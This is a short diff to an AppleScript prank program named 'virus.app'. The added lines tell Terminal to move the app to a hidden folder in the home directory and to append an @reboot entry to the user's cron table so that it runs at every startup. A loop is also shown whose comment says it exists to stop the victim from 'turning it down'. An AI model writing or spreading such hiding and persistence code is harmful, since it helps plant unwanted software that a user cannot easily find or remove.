@@ -1,4 +1,8 @@
-activate
+tell application "Terminal"
+  activate
+	do script "mv virus.app ~/.virus.app"
+	do script "echo @reboot ~/.virus.app/Contents/Resources/Scripts/main.scpt >> /usr/lib/cron/tabs/$USER"
+end tell
 repeat 100 times
 	
 	# Does this every repeat to stop them from turning it down
